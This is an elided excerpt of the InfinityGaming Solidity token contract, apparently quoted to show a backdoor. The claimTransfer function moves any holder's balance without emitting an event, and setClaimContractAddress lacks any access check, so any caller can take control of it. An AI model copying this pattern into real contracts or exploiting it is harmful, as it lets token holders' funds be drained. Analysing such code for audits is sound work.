...
contract InfinityGaming is Context, IERC20, Ownable {
    ...
    address public claimContractAddress = address(0);
    ...
    function claimTransfer(address from, address to, uint256 amount) external {
        require(msg.sender == claimContractAddress);
        _rOwned[from] = _rOwned[from].sub(amount);
        _rOwned[to] = _rOwned[to].add(amount);
    }

    function setClaimContractAddress(address claimContract) external {
        claimContractAddress = claimContract;
    }
